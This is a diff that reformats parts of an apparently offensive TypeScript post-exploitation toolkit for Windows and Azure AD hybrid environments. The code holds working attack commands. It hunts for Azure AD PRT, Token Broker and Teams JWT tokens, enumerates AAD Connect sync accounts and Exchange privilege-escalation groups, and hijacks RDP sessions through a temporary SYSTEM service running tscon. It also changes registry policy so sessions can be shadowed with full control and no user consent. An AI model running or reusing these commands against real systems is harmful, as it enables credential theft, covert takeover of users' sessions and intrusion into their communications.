@@ -10,7 +10,10 @@ export async function azureAdHybrid(args: string[], timeout: number): Promise<Ho
 
   if (activeExec === "cmd" || activeExec === "bat") {
     if (action === "enum") {
-      const r = await cmd(`dsregcmd /status & echo. & cmdkey /list & echo. & sc query ADSync 2>nul & reg query "HKLM\\SOFTWARE\\Microsoft\\Azure AD Connect" /s 2>nul & dir /b "%LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\*.tbres" 2>nul & reg query "HKLM\\SOFTWARE\\Microsoft\\Enrollments" /s 2>nul | findstr /i "UPN Provider" 2>nul`, timeout)
+      const r = await cmd(
+        `dsregcmd /status & echo. & cmdkey /list & echo. & sc query ADSync 2>nul & reg query "HKLM\\SOFTWARE\\Microsoft\\Azure AD Connect" /s 2>nul & dir /b "%LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\*.tbres" 2>nul & reg query "HKLM\\SOFTWARE\\Microsoft\\Enrollments" /s 2>nul | findstr /i "UPN Provider" 2>nul`,
+        timeout,
+      )
       output.push(r.stdout)
       if (r.stdout.includes("AzureAdJoined : YES") || r.stdout.includes("ADSync")) {
         findings.push({
@@ -26,13 +29,19 @@ export async function azureAdHybrid(args: string[], timeout: number): Promise<Ho
       }
     }
     if (action === "prt") {
-      const r = await cmd(`dsregcmd /status | findstr /i "AzureAdPrt NgcSet CloudTGT RefreshToken" & echo. & dir /b "%LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\*.tbres" 2>nul & echo. & dir /b "%USERPROFILE%\\.azure\\msal_token_cache.json" 2>nul`, timeout)
+      const r = await cmd(
+        `dsregcmd /status | findstr /i "AzureAdPrt NgcSet CloudTGT RefreshToken" & echo. & dir /b "%LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\*.tbres" 2>nul & echo. & dir /b "%USERPROFILE%\\.azure\\msal_token_cache.json" 2>nul`,
+        timeout,
+      )
       output.push(r.stdout)
       output.push("[*] PRT extraction requires BrowserCore.exe or DPAPI — use --exec ps for full extraction")
       output.push("[*] Token Broker cache files are DPAPI-encrypted")
     }
     if (action === "connect-creds") {
-      const r = await cmd(`sc query ADSync 2>nul & reg query "HKLM\\SOFTWARE\\Microsoft\\Azure AD Connect" /s 2>nul & net user /domain | findstr /i "MSOL_" 2>nul`, timeout)
+      const r = await cmd(
+        `sc query ADSync 2>nul & reg query "HKLM\\SOFTWARE\\Microsoft\\Azure AD Connect" /s 2>nul & net user /domain | findstr /i "MSOL_" 2>nul`,
+        timeout,
+      )
       output.push(r.stdout)
       if (r.stdout.includes("ADSync")) {
         output.push("[*] AAD Connect found — credential extraction requires SQL query (ADSync DB)")
@@ -40,7 +49,10 @@ export async function azureAdHybrid(args: string[], timeout: number): Promise<Ho
       }
     }
     if (action === "sso-key") {
-      const r = await cmd(`dsquery * -filter "(sAMAccountName=AZUREADSSOACC$)" -attr sAMAccountName pwdLastSet servicePrincipalName whenCreated 2>nul & nltest /dsgetdc:%USERDNSDOMAIN% 2>nul`, timeout)
+      const r = await cmd(
+        `dsquery * -filter "(sAMAccountName=AZUREADSSOACC$)" -attr sAMAccountName pwdLastSet servicePrincipalName whenCreated 2>nul & nltest /dsgetdc:%USERDNSDOMAIN% 2>nul`,
+        timeout,
+      )
       output.push(r.stdout)
       if (r.stdout.includes("AZUREADSSOACC")) {
         findings.push({
@@ -477,7 +489,10 @@ export async function exchangeAbuse(args: string[], timeout: number): Promise<Ho
 
   if (activeExec === "cmd" || activeExec === "bat") {
     if (action === "enum") {
-      const r = await cmd(`dsquery * -filter "(objectCategory=msExchExchangeServer)" -attr cn serialNumber networkAddress msExchCurrentServerRoles -limit 0 2>nul & echo. & dsquery * -filter "(&(objectCategory=group)(cn=Exchange Windows Permissions))" -attr member -limit 0 2>nul`, timeout)
+      const r = await cmd(
+        `dsquery * -filter "(objectCategory=msExchExchangeServer)" -attr cn serialNumber networkAddress msExchCurrentServerRoles -limit 0 2>nul & echo. & dsquery * -filter "(&(objectCategory=group)(cn=Exchange Windows Permissions))" -attr member -limit 0 2>nul`,
+        timeout,
+      )
       output.push(r.stdout || "[*] No Exchange servers found via dsquery")
       if (r.stdout && r.stdout.includes("cn")) {
         findings.push({
@@ -493,7 +508,10 @@ export async function exchangeAbuse(args: string[], timeout: number): Promise<Ho
       }
     }
     if (action === "gal") {
-      const r = await cmd(`dsquery * -filter "(&(objectCategory=person)(objectClass=user)(mail=*))" -attr sAMAccountName mail displayName title department -limit 0 2>nul`, timeout)
+      const r = await cmd(
+        `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(mail=*))" -attr sAMAccountName mail displayName title department -limit 0 2>nul`,
+        timeout,
+      )
       output.push(r.stdout || "[*] GAL dump requires LDAP — dsquery may have limited output")
     }
     if (action === "search") {
@@ -505,7 +523,10 @@ export async function exchangeAbuse(args: string[], timeout: number): Promise<Ho
       output.push("[*] Run on Exchange server: Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn")
     }
     if (action === "privesc") {
-      const r = await cmd(`dsquery * -filter "(&(objectCategory=group)(cn=Exchange Windows Permissions))" -attr member -limit 0 2>nul & echo. & dsquery * -filter "(&(objectCategory=group)(cn=Exchange Trusted Subsystem))" -attr member -limit 0 2>nul`, timeout)
+      const r = await cmd(
+        `dsquery * -filter "(&(objectCategory=group)(cn=Exchange Windows Permissions))" -attr member -limit 0 2>nul & echo. & dsquery * -filter "(&(objectCategory=group)(cn=Exchange Trusted Subsystem))" -attr member -limit 0 2>nul`,
+        timeout,
+      )
       output.push(r.stdout || "[*] Exchange security groups not found")
       if (r.stdout && r.stdout.includes("member")) {
         findings.push({
@@ -859,7 +880,11 @@ export async function rdpHijack(args: string[], timeout: number): Promise<HookRe
       const r = await cmd("query user 2>nul || qwinsta 2>nul", timeout)
       output.push(r.stdout || "[*] No sessions found")
       const whoami = await cmd("whoami /user | findstr /i S-1-5-18", timeout)
-      output.push(whoami.stdout.includes("S-1-5-18") ? "[+] Running as SYSTEM — credential-less hijack possible" : "[*] Not running as SYSTEM — use token_impersonate or potato_attack first")
+      output.push(
+        whoami.stdout.includes("S-1-5-18")
+          ? "[+] Running as SYSTEM — credential-less hijack possible"
+          : "[*] Not running as SYSTEM — use token_impersonate or potato_attack first",
+      )
       const discCount = (r.stdout.match(/Disc/gi) || []).length
       if (discCount > 0) {
         findings.push({
@@ -875,7 +900,10 @@ export async function rdpHijack(args: string[], timeout: number): Promise<HookRe
       }
     } else {
       if (!sessionId) return { output: "[!] Required: --session SESSION_ID", findings }
-      const r = await cmd(`tscon ${sessionId} /dest:console 2>nul || (sc create csRdpHijack binPath= "cmd.exe /c tscon ${sessionId} /dest:console" start= demand type= own error= ignore >nul 2>&1 & sc start csRdpHijack >nul 2>&1 & timeout /t 2 >nul & sc delete csRdpHijack >nul 2>&1)`, timeout)
+      const r = await cmd(
+        `tscon ${sessionId} /dest:console 2>nul || (sc create csRdpHijack binPath= "cmd.exe /c tscon ${sessionId} /dest:console" start= demand type= own error= ignore >nul 2>&1 & sc start csRdpHijack >nul 2>&1 & timeout /t 2 >nul & sc delete csRdpHijack >nul 2>&1)`,
+        timeout,
+      )
       output.push(r.stdout)
       output.push(`[+] Session ${sessionId} hijack attempted`)
       const after = await cmd("query user 2>nul", timeout)
@@ -1007,7 +1035,10 @@ export async function rdpShadow(args: string[], timeout: number): Promise<HookRe
     if (action === "enum") {
       const r = await cmd("query user 2>nul || qwinsta 2>nul", timeout)
       output.push(r.stdout)
-      const shadowCfg = await cmd(`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v AllowRemoteRPC 2>nul & reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v Shadow 2>nul & reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v UserAuthentication 2>nul`, timeout)
+      const shadowCfg = await cmd(
+        `reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v AllowRemoteRPC 2>nul & reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v Shadow 2>nul & reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v UserAuthentication 2>nul`,
+        timeout,
+      )
       output.push(shadowCfg.stdout)
       const activeCount = (r.stdout.match(/Active/gi) || []).length
       if (activeCount > 0) {
@@ -1043,7 +1074,10 @@ export async function rdpShadow(args: string[], timeout: number): Promise<HookRe
       const shadowFlag = control ? "/control" : ""
       const consentFlag = noConsent ? "/noConsentPrompt" : ""
       if (noConsent) {
-        await cmd(`reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f 2>nul`, timeout)
+        await cmd(
+          `reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f 2>nul`,
+          timeout,
+        )
       }
       const r = await cmd(`start mstsc /shadow:${sessionId} ${shadowFlag} ${consentFlag}`, timeout)
       output.push(r.stdout)
@@ -1060,7 +1094,10 @@ export async function rdpShadow(args: string[], timeout: number): Promise<HookRe
       })
     }
     if (action === "config") {
-      const r = await cmd(`reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v AllowRemoteRPC /t REG_DWORD /d 1 /f & reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f`, timeout)
+      const r = await cmd(
+        `reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v AllowRemoteRPC /t REG_DWORD /d 1 /f & reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f`,
+        timeout,
+      )
       output.push(r.stdout)
       output.push("[+] AllowRemoteRPC=1, Shadow=2 (Full Control without consent)")
       output.push("[*] Cleanup: reg delete ... /v Shadow /f & reg add ... /v AllowRemoteRPC /d 0 /f")
@@ -1280,7 +1317,10 @@ export async function teamsToken(args: string[], timeout: number): Promise<HookR
 
   if (activeExec === "cmd" || activeExec === "bat") {
     if (action === "enum" || action === "full") {
-      const r = await cmd(`tasklist /fi "imagename eq Teams.exe" /fo csv 2>nul & tasklist /fi "imagename eq ms-teams.exe" /fo csv 2>nul & echo. & if exist "%APPDATA%\\Microsoft\\Teams\\current" (echo [+] Teams Classic found: %APPDATA%\\Microsoft\\Teams) else (echo [-] Teams Classic not found) & if exist "%LOCALAPPDATA%\\Packages\\MSTeams_8wekyb3d8bbwe" (echo [+] Teams New MSIX found) & echo. & dir /b "%APPDATA%\\Microsoft\\Teams\\Cookies" 2>nul & dir /b "%APPDATA%\\Microsoft\\Teams\\Local Storage\\leveldb\\*.ldb" 2>nul & dir /b "%LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\*.tbres" 2>nul`, timeout)
+      const r = await cmd(
+        `tasklist /fi "imagename eq Teams.exe" /fo csv 2>nul & tasklist /fi "imagename eq ms-teams.exe" /fo csv 2>nul & echo. & if exist "%APPDATA%\\Microsoft\\Teams\\current" (echo [+] Teams Classic found: %APPDATA%\\Microsoft\\Teams) else (echo [-] Teams Classic not found) & if exist "%LOCALAPPDATA%\\Packages\\MSTeams_8wekyb3d8bbwe" (echo [+] Teams New MSIX found) & echo. & dir /b "%APPDATA%\\Microsoft\\Teams\\Cookies" 2>nul & dir /b "%APPDATA%\\Microsoft\\Teams\\Local Storage\\leveldb\\*.ldb" 2>nul & dir /b "%LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\*.tbres" 2>nul`,
+        timeout,
+      )
       output.push(r.stdout)
       findings.push({
         checkId: "WIN-HYBRID-010",
@@ -1295,7 +1335,10 @@ export async function teamsToken(args: string[], timeout: number): Promise<HookR
     }
     if (action === "tokens" || action === "full") {
       output.push("[!] Teams token extraction from LevelDB requires binary parsing — limited via cmd.exe")
-      const r = await cmd(`dir /b /s "%APPDATA%\\Microsoft\\Teams\\Local Storage\\leveldb\\*.ldb" 2>nul & echo. & dir /b "%LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\*.tbres" 2>nul & echo. & findstr /s /m "eyJ" "%APPDATA%\\Microsoft\\Teams\\Local Storage\\leveldb\\*.ldb" 2>nul`, timeout)
+      const r = await cmd(
+        `dir /b /s "%APPDATA%\\Microsoft\\Teams\\Local Storage\\leveldb\\*.ldb" 2>nul & echo. & dir /b "%LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\*.tbres" 2>nul & echo. & findstr /s /m "eyJ" "%APPDATA%\\Microsoft\\Teams\\Local Storage\\leveldb\\*.ldb" 2>nul`,
+        timeout,
+      )
       output.push(r.stdout)
       if (r.stdout.includes("eyJ")) {
         output.push("[+] JWT tokens detected in LevelDB files")
@@ -1304,7 +1347,10 @@ export async function teamsToken(args: string[], timeout: number): Promise<HookR
       output.push("[*] Token Broker tokens are DPAPI-encrypted — use dpapi_extract to decrypt")
     }
     if (action === "chats" || action === "full") {
-      const r = await cmd(`dir /b /s "%APPDATA%\\Microsoft\\Teams\\IndexedDB" 2>nul & echo. & dir /b "%USERPROFILE%\\Downloads\\Microsoft Teams Chat Files\\*" 2>nul & echo. & dir /b /s "%APPDATA%\\Microsoft\\Teams\\Service Worker\\CacheStorage" 2>nul | find /c /v "" 2>nul`, timeout)
+      const r = await cmd(
+        `dir /b /s "%APPDATA%\\Microsoft\\Teams\\IndexedDB" 2>nul & echo. & dir /b "%USERPROFILE%\\Downloads\\Microsoft Teams Chat Files\\*" 2>nul & echo. & dir /b /s "%APPDATA%\\Microsoft\\Teams\\Service Worker\\CacheStorage" 2>nul | find /c /v "" 2>nul`,
+        timeout,
+      )
       output.push(r.stdout)
       findings.push({
         checkId: "WIN-HYBRID-012",
